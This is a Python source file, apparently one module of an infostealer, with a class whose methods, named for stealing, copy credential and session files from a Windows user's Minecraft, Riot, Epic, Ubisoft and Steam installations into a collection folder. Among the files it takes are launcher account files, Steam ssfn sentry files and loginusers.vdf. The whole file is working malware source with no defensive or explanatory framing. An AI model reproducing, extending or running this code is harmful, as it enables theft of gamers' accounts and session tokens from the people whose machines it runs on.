import os
import shutil
import logging
import winreg


class Games:
    ROAMING = os.getenv('APPDATA', '')
    LOCALAPPDATA = os.getenv('LOCALAPPDATA', '')

    _log = logging.getLogger('Games')

    @classmethod
    def _steal_minecraft(cls, out_dir: str) -> None:
        mc_dir = os.path.join(cls.ROAMING, '.minecraft')
        if not os.path.isdir(mc_dir):
            return

        dst = os.path.join(out_dir, 'Minecraft')
        os.makedirs(dst, exist_ok=True)

        targets = ['launcher_accounts.json', 'launcher_profiles.json',
                    'launcher_accounts_microsoft_store.json']
        for fname in targets:
            src = os.path.join(mc_dir, fname)
            if os.path.isfile(src):
                try:
                    shutil.copy2(src, os.path.join(dst, fname))
                    cls._log.info(f'Copied Minecraft {fname}')
                except Exception as e:
                    cls._log.debug(f'Failed to copy {fname}: {e}')

        # Also grab launcher_log.txt for session tokens
        log_file = os.path.join(mc_dir, 'launcher_log.txt')
        if os.path.isfile(log_file):
            try:
                fsize = os.path.getsize(log_file)
                if fsize <= 5 * 1024 * 1024:
                    shutil.copy2(log_file, os.path.join(dst, 'launcher_log.txt'))
            except Exception:
                pass

    @classmethod
    def _steal_riot(cls, out_dir: str) -> None:
        riot_path = os.path.join(cls.LOCALAPPDATA, 'Riot Games', 'Riot Client', 'Data')
        if not os.path.isdir(riot_path):
            return

        dst = os.path.join(out_dir, 'RiotGames')
        os.makedirs(dst, exist_ok=True)

        targets = ['RiotGamesPrivateSettings.yaml', 'RiotClientPrivateSettings.yaml']
        for fname in targets:
            src = os.path.join(riot_path, fname)
            if os.path.isfile(src):
                try:
                    shutil.copy2(src, os.path.join(dst, fname))
                    cls._log.info(f'Copied Riot {fname}')
                except Exception as e:
                    cls._log.debug(f'Failed to copy {fname}: {e}')

    @classmethod
    def _steal_epic(cls, out_dir: str) -> None:
        epic_base = os.path.join(cls.LOCALAPPDATA, 'EpicGamesLauncher', 'Saved')
        if not os.path.isdir(epic_base):
            return

        dst = os.path.join(out_dir, 'EpicGames')
        os.makedirs(dst, exist_ok=True)

        config_path = os.path.join(epic_base, 'Config', 'Windows', 'GameUserSettings.ini')
        if os.path.isfile(config_path):
            try:
                shutil.copy2(config_path, os.path.join(dst, 'GameUserSettings.ini'))
            except Exception:
                pass

        logs_dir = os.path.join(epic_base, 'Logs')
        if os.path.isdir(logs_dir):
            dst_logs = os.path.join(dst, 'Logs')
            os.makedirs(dst_logs, exist_ok=True)
            for fname in os.listdir(logs_dir):
                src = os.path.join(logs_dir, fname)
                if os.path.isfile(src) and os.path.getsize(src) <= 5 * 1024 * 1024:
                    try:
                        shutil.copy2(src, os.path.join(dst_logs, fname))
                    except Exception:
                        pass

    @classmethod
    def _steal_uplay(cls, out_dir: str) -> None:
        uplay_dir = os.path.join(cls.LOCALAPPDATA, 'Ubisoft Game Launcher')
        if not os.path.isdir(uplay_dir):
            return

        dst = os.path.join(out_dir, 'Uplay')
        os.makedirs(dst, exist_ok=True)

        for root, dirs, files in os.walk(uplay_dir):
            # Skip logs and crash dumps
            dirs[:] = [d for d in dirs if d.lower() not in ('logs', 'crashdumps', 'cache')]
            rel = os.path.relpath(root, uplay_dir)
            dst_sub = os.path.join(dst, rel)
            os.makedirs(dst_sub, exist_ok=True)

            for fname in files:
                src_file = os.path.join(root, fname)
                try:
                    fsize = os.path.getsize(src_file)
                    if fsize <= 5 * 1024 * 1024:
                        shutil.copy2(src_file, os.path.join(dst_sub, fname))
                except Exception:
                    continue

    @classmethod
    def _steal_steam(cls, out_dir: str) -> None:
        steam_path = None

        # Try registry first
        try:
            with winreg.OpenKey(winreg.HKEY_CURRENT_USER, r'Software\Valve\Steam') as key:
                steam_path = winreg.QueryValueEx(key, 'SteamPath')[0]
        except Exception:
            pass

        # Fallback to common paths
        if not steam_path or not os.path.isdir(steam_path):
            common = [
                os.path.join(os.environ.get('ProgramFiles(x86)', ''), 'Steam'),
                os.path.join(os.environ.get('ProgramFiles', ''), 'Steam'),
                r'C:\Steam',
            ]
            for p in common:
                if os.path.isdir(p):
                    steam_path = p
                    break

        if not steam_path or not os.path.isdir(steam_path):
            return

        dst = os.path.join(out_dir, 'Steam')
        os.makedirs(dst, exist_ok=True)

        # Copy config directory
        config_dir = os.path.join(steam_path, 'config')
        if os.path.isdir(config_dir):
            dst_config = os.path.join(dst, 'config')
            try:
                shutil.copytree(config_dir, dst_config, dirs_exist_ok=True)
                cls._log.info('Copied Steam config/')
            except Exception as e:
                cls._log.debug(f'Failed to copy Steam config: {e}')

        # Copy ssfn files (Steam Sentry Files — session tokens)
        for fname in os.listdir(steam_path):
            if fname.startswith('ssfn') or fname == 'loginusers.vdf':
                src = os.path.join(steam_path, fname)
                if os.path.isfile(src):
                    try:
                        shutil.copy2(src, os.path.join(dst, fname))
                    except Exception:
                        pass

    @classmethod
    def run(cls, output_dir: str) -> None:
        out = os.path.join(output_dir, 'Games')
        os.makedirs(out, exist_ok=True)

        cls._steal_minecraft(out)
        cls._steal_riot(out)
        cls._steal_epic(out)
        cls._steal_uplay(out)
        cls._steal_steam(out)

        cls._log.info(f'Game credential collection complete -> {out}')
